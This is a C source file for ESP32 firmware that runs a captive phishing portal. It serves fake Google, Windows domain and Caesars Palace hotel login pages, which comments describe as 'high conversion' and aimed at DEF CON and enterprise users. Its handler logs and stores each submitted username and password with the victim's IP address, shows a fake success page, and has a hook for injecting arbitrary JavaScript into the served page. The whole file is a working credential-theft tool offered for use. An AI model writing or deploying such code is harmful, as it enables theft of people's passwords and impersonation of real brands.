#include "wifi_engine.h"
#include "esp_log.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "storage_manager.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "PORTAL";

static void url_decode(char *s);

static TaskHandle_t s_portal_task = NULL;
static volatile bool s_running = false;
static int s_server_fd = -1;
static char *s_js_inject = NULL;

/* ─────────────────────────────────────────────────────────────────────
   Premium Captive Portal Templates — DEF CON Grade
   ───────────────────────────────────────────────────────────────────── */

/* Template 0: Generic "Free WiFi" — Google-style sign-in.  High conversion. */
static const char PORTAL_GENERIC[] =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in - Free WiFi</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".wrap{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);padding:48px 40px;max-width:450px;width:95%;text-align:center}"
    ".logo{font-size:28px;color:#4285f4;font-weight:300;letter-spacing:-1px;margin-bottom:8px}"
    ".logo b{color:#ea4335}oo{color:#fbbc04}gg{color:#34a853}le{color:#4285f4}"
    "h1{font-size:24px;color:#202124;font-weight:400;margin-bottom:8px}"
    "p{color:#5f6368;font-size:14px;margin-bottom:28px}"
    "input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:.2s}"
    "input:focus{border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,.2)}"
    ".btn{width:100%;margin-top:20px;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;letter-spacing:.25px}"
    ".btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.3)}"
    ".spinner{display:none;margin:16px auto;width:32px;height:32px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    ".footer{margin-top:24px;font-size:12px;color:#5f6368}"
    "</style></head><body>"
    "<div class='wrap'>"
    "<div class='logo'>G<b>o</b>ogle</div>"
    "<h1>Sign in to Wi-Fi</h1>"
    "<p>Use your Google Account to connect to this network</p>"
    "<form id='f' method='POST' action='/'>"
    "<input type='email' name='username' placeholder='Email or phone' required autocomplete='email'>"
    "<input type='password' name='password' placeholder='Enter your password' required autocomplete='current-password'>"
    "<button class='btn' type='submit' onclick='go()'>Next</button>"
    "</form>"
    "<div class='spinner' id='spin'></div>"
    "<div class='footer'>By continuing, you agree to the Terms of Service</div>"
    "</div>"
    "<script>function go(){document.getElementById('spin').style.display='block';}"
    "document.getElementById('f').addEventListener('submit',function(){go();setTimeout(function(){},500);});"
    "</script></body></html>";

/* Template 1: Corporate Windows AD login — targets enterprise users */
static const char PORTAL_CORPORATE[] =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Windows Security</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Segoe UI',system-ui,sans-serif;background:#0078d4;display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".wrap{background:#fff;width:420px;max-width:95vw;padding:0;box-shadow:0 4px 24px rgba(0,0,0,.3)}"
    ".hdr{background:#0078d4;padding:24px 28px 20px;color:#fff}"
    ".hdr .logo{font-size:20px;font-weight:600;letter-spacing:-.3px}"
    ".hdr p{font-size:13px;opacity:.9;margin-top:4px}"
    ".body{padding:28px}"
    "h2{font-size:20px;color:#1b1b1b;font-weight:400;margin-bottom:20px}"
    "label{display:block;font-size:13px;color:#323130;margin-bottom:4px}"
    "input{width:100%;padding:10px 12px;border:1px solid #8a8886;border-radius:2px;font-size:14px;font-family:inherit;outline:none;margin-bottom:16px}"
    "input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}"
    ".btn{background:#0078d4;color:#fff;border:none;padding:10px 20px;font-size:14px;cursor:pointer;float:right}"
    ".btn:hover{background:#106ebe}"
    ".alt{font-size:13px;color:#0078d4;cursor:pointer;display:block;margin-top:8px}"
    ".warn{font-size:12px;color:#605e5c;margin-top:16px;clear:both;padding-top:16px;border-top:1px solid #edebe9}"
    "</style></head><body>"
    "<div class='wrap'>"
    "<div class='hdr'><div class='logo'>\U0001f5a5 Windows Security</div>"
    "<p>Network Authentication Required</p></div>"
    "<div class='body'>"
    "<h2>Enter your credentials</h2>"
    "<form method='POST' action='/'>"
    "<label>Domain\\Username</label>"
    "<input type='text' name='username' placeholder='DOMAIN\\username' required autocomplete='username'>"
    "<label>Password</label>"
    "<input type='password' name='password' placeholder='Password' required autocomplete='current-password'>"
    "<button class='btn' type='submit'>OK</button>"
    "</form>"
    "<span class='alt'>Use another account</span>"
    "<div class='warn'>&#x26A0; This network requires domain authentication. "
    "Your credentials are secured with enterprise encryption.</div>"
    "</div></div></body></html>";

/* Template 2: Hotel captive portal — high relevance at DEF CON/Caesars */
static const char PORTAL_HOTEL[] =
    "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Hotel Wi-Fi — Welcome</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}"
    ".wrap{background:#fff;max-width:440px;width:95%;border-radius:4px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
    ".hdr{background:linear-gradient(135deg,#c9a227,#e8c84a);padding:30px;text-align:center;color:#1a1a2e}"
    ".hdr .name{font-size:26px;font-weight:300;letter-spacing:3px;text-transform:uppercase}"
    ".hdr .tag{font-size:11px;letter-spacing:2px;opacity:.8;margin-top:4px}"
    ".body{padding:30px}"
    "h2{font-size:18px;color:#333;font-weight:400;margin-bottom:6px}"
    "p{font-size:13px;color:#666;margin-bottom:24px}"
    "label{display:block;font-size:12px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}"
    "input{width:100%;padding:12px;border:1px solid #ddd;border-radius:2px;font-size:14px;margin-bottom:16px;outline:none}"
    "input:focus{border-color:#c9a227}"
    ".btn{width:100%;padding:14px;background:#1a1a2e;color:#c9a227;border:none;font-size:14px;font-weight:600;letter-spacing:2px;text-transform:uppercase;cursor:pointer}"
    ".btn:hover{background:#2d2d4e}"
    ".terms{font-size:11px;color:#aaa;text-align:center;margin-top:16px;line-height:1.5}"
    "</style></head><body>"
    "<div class='wrap'>"
    "<div class='hdr'><div class='name'>CAESARS PALACE</div><div class='tag'>LAS VEGAS &#x2022; RESORT &amp; CASINO</div></div>"
    "<div class='body'>"
    "<h2>Welcome to Hotel Wi-Fi</h2>"
    "<p>Please sign in with your reservation details to connect.</p>"
    "<form method='POST' action='/'>"
    "<label>Last Name / Email</label>"
    "<input type='text' name='username' placeholder='Enter last name or email' required>"
    "<label>Room Number / Confirmation</label>"
    "<input type='password' name='password' placeholder='Room number or confirmation #' required>"
    "<button class='btn' type='submit'>Connect to Wi-Fi</button>"
    "</form>"
    "<div class='terms'>By connecting, you agree to our Acceptable Use Policy. "
    "Complimentary Wi-Fi is available to all registered guests.</div>"
    "</div></div></body></html>";


static const char *s_portal_html = NULL;  /* Points to selected template */

static void serve_redirect(int fd)
{
    const char *resp =
        "HTTP/1.1 302 Found\r\n"
        "Location: http://192.168.4.1/\r\n"
        "Content-Length: 0\r\n\r\n";
    send(fd, resp, strlen(resp), 0);
}

static void serve_index(int fd)
{
    const char *tmpl = s_portal_html ? s_portal_html : PORTAL_GENERIC;
    size_t html_len = strlen(tmpl);
    char hdr[256];
    int hlen = snprintf(hdr, sizeof(hdr),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n", html_len);
    send(fd, hdr, hlen, 0);
    send(fd, tmpl, html_len, 0);
    if (s_js_inject) send(fd, s_js_inject, strlen(s_js_inject), 0);
}

static void handle_post(int fd, const char *body, const char *client_ip)
{
    char user[128] = {0}, pass[128] = {0};

    const char *u = strstr(body, "username=");
    const char *p = strstr(body, "password=");

    if (u) {
        u += 9;
        const char *end = strchr(u, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - u);
        if (len > sizeof(user) - 1) len = sizeof(user) - 1;
        strncpy(user, u, len);
        url_decode(user);
    }

    if (p) {
        p += 9;
        const char *end = strchr(p, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - p);
        if (len > sizeof(pass) - 1) len = sizeof(pass) - 1;
        strncpy(pass, p, len);
        url_decode(pass);
    }

    ESP_LOGI(TAG, "CREDENTIALS: user='%s' pass='%s' from %s", user, pass, client_ip);
    storage_log_credential("captive_portal", user, pass, client_ip);

    const char *resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Connection: close\r\n"
        "\r\n"
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<title>Connected</title>"
        "<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5}"
        ".card{background:#fff;padding:40px;border-radius:12px;text-align:center}"
        "h2{color:#28a745} p{color:#666}</style>"
        "</head><body><div class='card'>"
        "<h2>✓ Connected Successfully</h2>"
        "<p>You will be redirected shortly...</p>"
        "<script>setTimeout(function(){window.location='http://google.com';},2000);</script>"
        "</div></body></html>";
    send(fd, resp, strlen(resp), 0);
}

static void url_decode(char *s)
{
    char *src = s, *dst = s;
    while (*src) {
        if (*src == '+') { *dst++ = ' '; src++; }
        else if (*src == '%' && *(src+1) && *(src+2)) {
            char hex[3] = {src[1], src[2], 0};
            *dst++ = strtol(hex, NULL, 16);
            src += 3;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

static void handle_client(int fd)
{
    char buf[2048];
    int len = recv(fd, buf, sizeof(buf) - 1, 0);
    if (len <= 0) { close(fd); return; }
    buf[len] = '\0';

    char method[16], path[256];
    sscanf(buf, "%15s %255s", method, path);

    const char *host_start = strstr(buf, "Host: ");
    char host[128] = {0};
    if (host_start) {
        sscanf(host_start + 6, "%127s", host);
    }

    if (strcmp(method, "GET") == 0) {
        serve_index(fd);
    } else if (strcmp(method, "POST") == 0) {
        const char *body = strstr(buf, "\r\n\r\n");
        if (body) {
            body += 4;
            struct sockaddr_in peer;
            socklen_t peer_len = sizeof(peer);
            getpeername(fd, (struct sockaddr *)&peer, &peer_len);
            char client_ip[16];
            inet_ntoa_r(peer.sin_addr, client_ip, sizeof(client_ip));
            handle_post(fd, body, client_ip);
        } else {
            serve_index(fd);
        }
    } else {
        serve_index(fd);
    }

    close(fd);
}

static void portal_task(void *arg)
{
    s_server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (s_server_fd < 0) {
        ESP_LOGE(TAG, "Failed to create socket");
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    int opt = 1;
    setsockopt(s_server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(80),
        .sin_addr = { .s_addr = INADDR_ANY },
    };

    if (bind(s_server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "Failed to bind port 80");
        close(s_server_fd);
        s_server_fd = -1;
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    listen(s_server_fd, 5);
    ESP_LOGI(TAG, "Captive portal listening on port 80");

    while (s_running) {
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(s_server_fd, &readfds);

        int ret = select(s_server_fd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) break;
        if (ret == 0) continue;

        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        int client_fd = accept(s_server_fd, (struct sockaddr *)&client_addr, &addr_len);
        if (client_fd >= 0) {
            handle_client(client_fd);
        }
    }

    close(s_server_fd);
    s_server_fd = -1;
    s_portal_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t captive_portal_start(const char *template_name)
{
    if (s_running) return ESP_OK;

    /* Select portal template */
    if (!template_name || strcmp(template_name, "generic") == 0)
        s_portal_html = PORTAL_GENERIC;
    else if (strcmp(template_name, "corporate") == 0)
        s_portal_html = PORTAL_CORPORATE;
    else if (strcmp(template_name, "hotel") == 0)
        s_portal_html = PORTAL_HOTEL;
    else
        s_portal_html = PORTAL_GENERIC;

    ESP_LOGI(TAG, "Captive portal starting (template: %s)",
             template_name ? template_name : "generic");

    s_running = true;
    xTaskCreatePinnedToCore(portal_task, "portal", 8192, NULL, 5,
                            &s_portal_task, 0);
    return ESP_OK;
}

esp_err_t captive_portal_stop(void)
{
    s_running = false;
    if (s_server_fd >= 0) {
        close(s_server_fd);
        s_server_fd = -1;
    }
    if (s_portal_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        s_portal_task = NULL;
    }
    if (s_js_inject) {
        free(s_js_inject);
        s_js_inject = NULL;
    }
    ESP_LOGI(TAG, "Captive portal stopped");
    return ESP_OK;
}

esp_err_t captive_portal_inject_js(const char *js_snippet)
{
    if (!js_snippet) return ESP_ERR_INVALID_ARG;
    if (s_js_inject) free(s_js_inject);
    s_js_inject = strdup(js_snippet);
    return ESP_OK;
}
